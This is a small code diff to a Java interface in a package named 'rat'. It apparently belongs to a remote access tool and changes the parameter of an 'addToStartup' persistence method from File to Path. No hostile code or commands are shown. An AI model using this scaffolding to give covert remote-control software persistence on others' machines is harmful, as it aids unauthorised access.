@@ -4,7 +4,7 @@
 
 package de.sogomn.rat.service;
 
-import java.io.File;
+import java.nio.file.Path;
 
 public interface IOperatingSystemService {
 	
@@ -12,7 +12,7 @@ public interface IOperatingSystemService {
 	
 	void restart();
 	
-	void addToStartup(final File file);
+	void addToStartup(final Path file);
 	
 	void removeFromStartup(final String name);
 	
